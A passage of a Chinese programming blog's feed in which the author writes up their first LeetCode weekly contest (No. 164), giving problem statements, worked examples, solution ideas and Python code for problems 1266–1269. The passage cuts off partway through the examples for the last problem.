= cost(<span class="number">1</span>, i)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i0 <span class="keyword">in</span> range(j<span class="number">-1</span>, i):</span><br><span class="line">                        dp[i][j] = min(dp[i][j], dp[i0][j<span class="number">-1</span>]+cost(i0+<span class="number">1</span>, i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[n][k]</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LeetCode Competitions - 164</title>
      <link href="/2019/12/09/LeetCode-Competitions-164/"/>
      <content type="html"><![CDATA[<blockquote><p>这是第一次参加LeetCode的周赛，全国排名为762/1675。在比赛中只解出了前两题。</p></blockquote><ul><li>[Solved] 表示在比赛中解出。</li><li>[Unsolved] 表示在比赛中未能解出。</li></ul><a id="more"></a><h2 id="Solved-1266-访问所有点的最小时间"><a href="#Solved-1266-访问所有点的最小时间" class="headerlink" title="[Solved] 1266.访问所有点的最小时间"></a>[Solved] 1266.访问所有点的最小时间</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>平面上有<code>n</code>个点，点的位置用整数坐标表示<code>points[i] = [xi, yi]</code>。请你计算访问所有这些点需要的最小时间（以秒为单位）。</p><p>你可以按照下面的规则在平面上移动：</p><ul><li>每一秒沿水平或者竖直方向移动一个单位长度，或者跨过对角线（可以看作在一秒内向水平和竖直方向各移动一个单位长度）。</li><li>必须按照数组中出现的顺序来访问这些点。</li></ul><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/24/1626_example_1.png" alt=""></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：points = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">-1</span>,<span class="number">0</span>]]</span><br><span class="line">输出：<span class="number">7</span></span><br><span class="line">解释：一条最佳的访问路径是： [<span class="number">1</span>,<span class="number">1</span>] -&gt; [<span class="number">2</span>,<span class="number">2</span>] -&gt; [<span class="number">3</span>,<span class="number">3</span>] -&gt; [<span class="number">3</span>,<span class="number">4</span>] -&gt; [<span class="number">2</span>,<span class="number">3</span>] -&gt; [<span class="number">1</span>,<span class="number">2</span>] -&gt; [<span class="number">0</span>,<span class="number">1</span>] -&gt; [<span class="number">-1</span>,<span class="number">0</span>]   </span><br><span class="line">从 [<span class="number">1</span>,<span class="number">1</span>] 到 [<span class="number">3</span>,<span class="number">4</span>] 需要 <span class="number">3</span> 秒 </span><br><span class="line">从 [<span class="number">3</span>,<span class="number">4</span>] 到 [<span class="number">-1</span>,<span class="number">0</span>] 需要 <span class="number">4</span> 秒</span><br><span class="line">一共需要 <span class="number">7</span> 秒</span><br></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：points = [[<span class="number">3</span>,<span class="number">2</span>],[<span class="number">-2</span>,<span class="number">2</span>]]</span><br><span class="line">输出：<span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="约束条件："><a href="#约束条件：" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>points.length == n</code></li><li><code>1 &lt;= n &lt;= 100</code></li><li><code>points[i].length == 2</code></li><li><code>-1000 &lt;= points[i][0], points[i][1] &lt;= 1000</code></li></ul><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>这道题在进行对角线移动时，可以在单位时间内同时进行X轴和Y轴的移动。因此，在计算两个点的距离时，只需要计算这两点在Y轴和X轴上距离的最大值即可。<br>设平面上两点坐标<code>p0=(x0, y0),p1=(x1,y1)</code>，则他们的<br>横坐标距离差为<code>dx=|x0-x1|</code>，纵坐标距离差为<code>dy=|y0-y1|</code>。分三种情况来计算从<code>p0</code>移动到<code>p1</code>的最少移动次数。</p><ul><li><code>dx &lt; dy</code>：沿对角线移动<code>dx</code>次，再竖直移动<code>dy-dx</code>次，总计<code>dx+(dy-dx)=dy</code></li><li><code>dx = dy</code>：沿对角线移动<code>dx</code>次</li><li><code>dx &gt; dy</code>：沿对角线移动<code>dy</code>次，再竖直移动<code>dx-dy</code>次，总计<code>dy+(dx-dy)=dx</code></li></ul><p>对于任意一种情况，从<code>p0</code>移动到<code>p1</code>的最少次数为<code>dx</code>和 <code>dy</code>中的较大值<code>max(dx, dy)</code>，这也被称作<code>p0</code>和<code>p1</code>之间的切比雪夫距离。</p><p>参考：</p><p><a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/solution/fang-wen-suo-you-dian-de-zui-xiao-shi-jian-by-leet/" target="_blank" rel="noopener">LeetCode官方题解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(self, points: List[List[int]])</span> -&gt; int:</span></span><br><span class="line">        time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(points)<span class="number">-1</span>):</span><br><span class="line">            time += max(abs(points[i+<span class="number">1</span>][<span class="number">0</span>] - points[i][<span class="number">0</span>]),abs(points[i+<span class="number">1</span>][<span class="number">1</span>] - points[i][<span class="number">1</span>]))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> time</span><br></pre></td></tr></table></figure><h2 id="Solved-1267-统计参与通信的服务器"><a href="#Solved-1267-统计参与通信的服务器" class="headerlink" title="[Solved] 1267.统计参与通信的服务器"></a>[Solved] 1267.统计参与通信的服务器</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p>这里有一幅服务器分布图，服务器的位置标识在 <code>m * n</code> 的整数矩阵网格 <code>grid</code> 中，1 表示单元格上有服务器，0 表示没有。</p><p>如果两台服务器位于同一行或者同一列，我们就认为它们之间可以进行通信。</p><p>请你统计并返回能够与至少一台其他服务器进行通信的服务器的数量。</p><h3 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/24/untitled-diagram-6.jpg" alt=""></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：没有一台服务器能与其他服务器进行通信。</span><br></pre></td></tr></table></figure><h3 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/24/untitled-diagram-4-1.jpg" alt=""></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：所有这些服务器都至少可以与一台别的服务器进行通信。</span><br></pre></td></tr></table></figure><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/24/untitled-diagram-1-3.jpg" alt=""></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：第一行的两台服务器互相通信，第三列的两台服务器互相通信，但右下角的服务器无法与其他服务器通信。</span><br></pre></td></tr></table></figure><h3 id="约束条件：-1"><a href="#约束条件：-1" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>m == grid.length</code></li><li><code>n == grid[i].length</code></li><li><code>1 &lt;= m &lt;= 250</code></li><li><code>1 &lt;= n &lt;= 250</code></li><li><code>grid[i][j] == 0 or 1</code></li></ul><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>方法一：</p><p>是我自己在比赛中想的方法。首先创建两个数组<code>row,col</code>，来统计每行每列都有几个设备，若第0行有2个设备，则<code>row[0]=2</code>，若第1列有3个设备，则<code>col[1]=3</code>。在<code>row,col</code>中，只要设备数量大于2，则满足条件。以示例2为例子，统计得到<code>row=[1,2], col=[2,1]</code>。<br>分别对<code>row,col</code>统计能够通信的设备总数时，会存在重复统计的情况，如示例2中<code>row[1]+col[0]=4</code>，<code>[1,0]</code>的设备被重复计算了一次，因此需要统计被重复计算的设备数量。</p><p>我们在对<code>row</code>进行统计的时候，如果<code>row[i]&gt;=2</code>，则检查当<code>col[j]&gt;=2</code>时，<code>grid[i][j]</code>是否为1，如果是则统计为重复的设备。</p><p>最后，能互相通信的设备总数为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum([elem <span class="keyword">for</span> elem <span class="keyword">in</span> row <span class="keyword">if</span> elem &gt;=<span class="number">2</span> ]) + </span><br><span class="line">sum([elem <span class="keyword">for</span> elem <span class="keyword">in</span> col <span class="keyword">if</span> elem &gt;=<span class="number">2</span> ]) - </span><br><span class="line">duplicated_num</span><br></pre></td></tr></table></figure><p>时间复杂度为：<code>O(MN+MN+N)=O(MN)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countServers</span><span class="params">(self, grid)</span> -&gt; int:</span></span><br><span class="line">        row = [<span class="number">0</span>] * len(grid)</span><br><span class="line">        col = [<span class="number">0</span>] * len(grid[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(row)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(col)):</span><br><span class="line">                <span class="keyword">if</span> grid[i][j] == <span class="number">1</span>:</span><br><span class="line">                    row[i] += <span class="number">1</span></span><br><span class="line">                    col[j] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        duplicated = <span class="number">0</span></span><br><span class="line">        sum_of_row = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> enumerate(row):</span><br><span class="line">            <span class="keyword">if</span> num &gt;=<span class="number">2</span>:</span><br><span class="line">                sum_of_row += num</span><br><span class="line">                <span class="keyword">for</span> j, num_j <span class="keyword">in</span> enumerate(col):</span><br><span class="line">                    <span class="keyword">if</span> num_j &gt;= <span class="number">2</span> <span class="keyword">and</span> grid[i][j] == <span class="number">1</span>:</span><br><span class="line">                        duplicated += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        sum_of_col = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num_j <span class="keyword">in</span> col:</span><br><span class="line">            <span class="keyword">if</span> num_j &gt;= <span class="number">2</span>:</span><br><span class="line">                sum_of_col += num_j</span><br><span class="line">        </span><br><span class="line">        result = sum_of_col + sum_of_row - duplicated</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="Unsolved-1268-统计参与通信的服务器"><a href="#Unsolved-1268-统计参与通信的服务器" class="headerlink" title="[Unsolved] 1268.统计参与通信的服务器"></a>[Unsolved] 1268.统计参与通信的服务器</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><p>给你一个产品数组 <code>products</code> 和一个字符串 <code>searchWord</code> ，<code>products</code>  数组中每个产品都是一个字符串。</p><p>请你设计一个推荐系统，在依次输入单词 <code>searchWord</code> 的每一个字母后，推荐 <code>products</code> 数组中前缀与 <code>searchWord</code> 相同的最多三个产品。如果前缀相同的可推荐产品超过三个，请按字典序返回最小的三个。</p><p>请你以二维列表的形式，返回在输入 <code>searchWord</code> 每个字母后相应的推荐产品的列表。</p><h3 id="示例1-2"><a href="#示例1-2" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：products = [<span class="string">"mobile"</span>,<span class="string">"mouse"</span>,<span class="string">"moneypot"</span>,<span class="string">"monitor"</span>,<span class="string">"mousepad"</span>], searchWord = <span class="string">"mouse"</span></span><br><span class="line">输出：[</span><br><span class="line">[<span class="string">"mobile"</span>,<span class="string">"moneypot"</span>,<span class="string">"monitor"</span>],</span><br><span class="line">[<span class="string">"mobile"</span>,<span class="string">"moneypot"</span>,<span class="string">"monitor"</span>],</span><br><span class="line">[<span class="string">"mouse"</span>,<span class="string">"mousepad"</span>],</span><br><span class="line">[<span class="string">"mouse"</span>,<span class="string">"mousepad"</span>],</span><br><span class="line">[<span class="string">"mouse"</span>,<span class="string">"mousepad"</span>]</span><br><span class="line">]</span><br><span class="line">解释：按字典序排序后的产品列表是 [<span class="string">"mobile"</span>,<span class="string">"moneypot"</span>,<span class="string">"monitor"</span>,<span class="string">"mouse"</span>,<span class="string">"mousepad"</span>]</span><br><span class="line">输入 m 和 mo，由于所有产品的前缀都相同，所以系统返回字典序最小的三个产品 [<span class="string">"mobile"</span>,<span class="string">"moneypot"</span>,<span class="string">"monitor"</span>]</span><br><span class="line">输入 mou， mous 和 mouse 后系统都返回 [<span class="string">"mouse"</span>,<span class="string">"mousepad"</span>]</span><br></pre></td></tr></table></figure><h3 id="示例2-2"><a href="#示例2-2" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：products = [<span class="string">"havana"</span>], searchWord = <span class="string">"havana"</span></span><br><span class="line">输出：[[<span class="string">"havana"</span>],[<span class="string">"havana"</span>],[<span class="string">"havana"</span>],[<span class="string">"havana"</span>],[<span class="string">"havana"</span>],[<span class="string">"havana"</span>]]</span><br></pre></td></tr></table></figure><h3 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：products = [<span class="string">"bags"</span>,<span class="string">"baggage"</span>,<span class="string">"banner"</span>,<span class="string">"box"</span>,<span class="string">"cloths"</span>], searchWord = <span class="string">"bags"</span></span><br><span class="line">输出：[[<span class="string">"baggage"</span>,<span class="string">"bags"</span>,<span class="string">"banner"</span>],[<span class="string">"baggage"</span>,<span class="string">"bags"</span>,<span class="string">"banner"</span>],[<span class="string">"baggage"</span>,<span class="string">"bags"</span>],[<span class="string">"bags"</span>]]</span><br></pre></td></tr></table></figure><h3 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：products = [<span class="string">"havana"</span>], searchWord = <span class="string">"tatiana"</span></span><br><span class="line">输出：[[],[],[],[],[],[],[]]</span><br></pre></td></tr></table></figure><h3 id="约束条件：-2"><a href="#约束条件：-2" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>1 &lt;= products.length &lt;= 1000</code></li><li><code>1 &lt;= Σ products[i].length &lt;= 2 * 10^4</code></li><li><code>products[i] 中所有的字符都是小写英文字母。</code></li><li><code>1 &lt;= searchWord.length &lt;= 1000</code></li><li><code>searchWord 中所有字符都是小写英文字母。</code></li></ul><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>方法一：</p><p>首先对所有产品按字典序排序。按照输入的<code>searchWord</code>的字符串顺序，匹配<code>products</code>，符合要求的就加入<br>到结果的列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">suggestedProducts</span><span class="params">(self, products, searchWord)</span>:</span></span><br><span class="line">        result = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(searchWord))]</span><br><span class="line">        products = sorted(products)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(searchWord)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> prod <span class="keyword">in</span> products:</span><br><span class="line">                <span class="keyword">if</span> searchWord[:i] == prod[:i] <span class="keyword">and</span> len(result[i<span class="number">-1</span>]) &lt; <span class="number">3</span>:</span><br><span class="line">                    result[i<span class="number">-1</span>].append(prod)</span><br><span class="line">                <span class="keyword">if</span> len(result[i<span class="number">-1</span>]) == <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>方法二：</p><p>建立前缀树，来搜索与输入关键词匹配的<code>products</code>序列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrieNode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.is_word = <span class="keyword">False</span></span><br><span class="line">        self.data = &#123;&#125;</span><br><span class="line">        self.count = <span class="number">0</span> <span class="comment"># 在题目测试样例中，会出现重复的单词</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.root = TrieNode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, word)</span>:</span></span><br><span class="line">        node = self.root</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> word:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> node.data:</span><br><span class="line">                node.data[c] = TrieNode()</span><br><span class="line">            node = node.data[c]</span><br><span class="line">        node.is_word = <span class="keyword">True</span></span><br><span class="line">        node.count += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, word)</span>:</span></span><br><span class="line">        node = self.root</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> word:</span><br><span class="line">            node = node.data.get(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> node.is_word</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">starts_with</span><span class="params">(self, prefix)</span>:</span></span><br><span class="line">        node = self.root</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> prefix:</span><br><span class="line">            node = node.data.get(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_start</span><span class="params">(self, prefix)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_get_key</span><span class="params">(pre, pre_node, words_list)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> pre_node.is_word:</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> range(pre_node.count):</span><br><span class="line">                    <span class="keyword">if</span> len(words_list) == <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    words_list.append(pre)</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> sorted(pre_node.data.keys()):</span><br><span class="line">                <span class="keyword">if</span> len(words_list) == <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                _get_key(pre + x, pre_node.data[x], words_list)</span><br><span class="line">    </span><br><span class="line">        words = []</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.starts_with(prefix):</span><br><span class="line">            <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line">        node = self.root</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> prefix:</span><br><span class="line">            node = node.data[c]</span><br><span class="line"></span><br><span class="line">        _get_key(prefix, node, words)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">suggestedProducts</span><span class="params">(self, products, searchWord)</span>:</span></span><br><span class="line">        result = []</span><br><span class="line">        t = Trie()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> prod <span class="keyword">in</span> products:</span><br><span class="line">            t.insert(prod)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(searchWord)+<span class="number">1</span>):</span><br><span class="line">            result.append(t.get_start(searchWord[:i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>方法三：</p><p>来自运行时间排名第二的代码。巧妙地设计了一个指针cur，在完成一次匹配之后，下次只需要从完成这次匹配的<br>前两个单词进行检查即可，而不是每次都重新开始遍历数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">suggestedProducts</span><span class="params">(self, products: List[str], searchWord: str)</span> -&gt; List[List[str]]:</span></span><br><span class="line">        products.sort()</span><br><span class="line">        ans=[[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(searchWord))]</span><br><span class="line">        cur=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(searchWord)):</span><br><span class="line">            k=<span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(cur,len(products)):</span><br><span class="line">                <span class="keyword">if</span> products[j][:i+<span class="number">1</span>]==searchWord[:i+<span class="number">1</span>]:</span><br><span class="line">                    ans[i]+=[products[j]]</span><br><span class="line">                    k-=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> k==<span class="number">0</span>:</span><br><span class="line">                    cur=j<span class="number">-2</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> ans[i]==[]:</span><br><span class="line">                <span class="keyword">return</span> ans</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="Unsolved-1269-停在原地的方案数"><a href="#Unsolved-1269-停在原地的方案数" class="headerlink" title="[Unsolved] 1269.停在原地的方案数"></a>[Unsolved] 1269.停在原地的方案数</h2><h3 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h3><p>有一个长度为 <code>arrLen</code> 的数组，开始有一个指针在索引 <code>0</code> 处。</p><p>每一步操作中，你可以将指针向左或向右移动 1 步，或者停在原地（指针不能被移动到数组范围外）。</p><p>给你两个整数 <code>steps</code> 和 <code>arrLen</code> ，请你计算并返回：在恰好执行 <code>steps</code> 次操作以后，指针仍然指向索引 0 处的方案数。</p><p>由于答案可能会很大，请返回方案数 模 <code>10^9 + 7</code> 后的结果。</p><h3 id="示例1-3"><a href="#示例1-3" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：steps = <span class="number">3</span>, arrLen = <span class="number">2</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：<span class="number">3</span> 步后，总共有 <span class="number">4</span> 种不同的方法可以停在索引 <span class="number">0</span> 处。</span><br><span class="line">向右，向左，不动</span><br><span class="line">不动，向右，向左</span><br><span class="line">向右，不动，向左</span><br><span class="line">不动，不动，不动</span><br></pre></td></tr></table></figure><h3 id="示例2-3"><a href="#示例2-3" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：steps = <span class="number">2</span>, arrLen = <span class="number">4</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：<span class="number">2</span> 步后，总共有 <span class="number">2</span> 种不同的方法可以停在索引 <span class="number">0</span> 处。</span><br><span class="line">向右，向左</span><br><span class="line">不动，不动</span><br></pre></td></tr></table></figure><h3 id="示例3-2"><a href="#示例3-2" class="headerlink" title="示例3:"></a>示例3:</h3><figure class="highlight 